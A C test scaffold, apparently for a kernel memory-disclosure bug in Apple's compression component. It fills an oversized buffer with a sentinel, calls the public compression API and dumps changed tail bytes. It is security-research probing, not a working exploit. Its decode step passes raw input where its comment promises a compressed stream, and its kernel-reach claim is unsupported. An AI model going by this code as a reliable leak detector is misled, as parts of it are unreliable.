/*
 * compression_leak_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2026-113910 (com.apple.kec.Compression, kernel memory
 *          disclosure via uninitialised memory)
 * Theory : an operation writes `N` output bytes into a caller buffer of size
 *          `M > N` and either returns `M` or leaves `[N, M)` uninitialised;
 *          a highly-compressible input makes N tiny, exposing the tail.
 * Status : behavioural test; needs no offsets.
 *
 * Build  : xcrun -sdk iphoneos clang -arch arm64 compression_leak_scaffold.c -o comp_leak
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Use the public libcompression API; if the bug is in the kernel kext this
 * API reaches, the tail will show kernel bytes rather than the sentinel. */
#include <compression.h>

#define INPUT_LEN   (8u * 1024u * 1024u)   /* 8 MiB of zeros */
#define SENTINEL    0xCC

static void dump_tail(const char *tag, const uint8_t *buf, size_t from,
                      size_t to) {
    size_t shown = 0;
    printf("[%s] tail bytes [%zu, %zu):", tag, from, to);
    for (size_t i = from; i < to && shown < 48; i++, shown++) {
        if (shown && shown % 16 == 0) printf("\n    ");
        printf(" %02X", buf[i]);
    }
    printf("\n");
}

int main(void) {
    uint8_t *input = malloc(INPUT_LEN);
    if (!input) return 1;
    memset(input, 0x00, INPUT_LEN);       /* compresses to almost nothing */

    size_t cap = INPUT_LEN;               /* deliberately over-sized */
    uint8_t *out = malloc(cap);
    if (!out) return 1;
    memset(out, SENTINEL, cap);           /* sentinel to detect the leak */

    size_t produced = compression_encode_buffer(
        out, cap,
        input, INPUT_LEN,
        NULL, COMPRESSION_LZ4);

    printf("[*] compression_encode_buffer produced %zu of capacity %zu\n",
           produced, cap);

    if (produced > 0 && produced < cap) {
        /* Are the bytes after `produced` the sentinel we wrote, or did the
         * kernel overwrite them? If they are no longer 0xCC, the callee
         * wrote past the declared output length. */
        size_t non_sentinel = 0;
        for (size_t i = produced; i < cap; i++) {
            if (out[i] != SENTINEL) non_sentinel++;
        }
        printf("[*] non-sentinel bytes in [%zu, %zu): %zu\n",
               produced, cap, non_sentinel);
        dump_tail("encode", out, produced, produced + 64 < cap ? produced + 64 : cap);
        if (non_sentinel)
            printf("[!] output buffer was written past the declared length\n");
    }

    /* Reverse direction: decompress a tiny stream into a large buffer. */
    memset(out, SENTINEL, cap);
    size_t produced2 = compression_decode_buffer(
        out, cap, input, INPUT_LEN, NULL, COMPRESSION_LZ4);
    printf("[*] compression_decode_buffer produced %zu\n", produced2);

    free(out);
    free(input);
    printf("[*] done. Compare against a 27.2 build.\n");
    return 0;
}
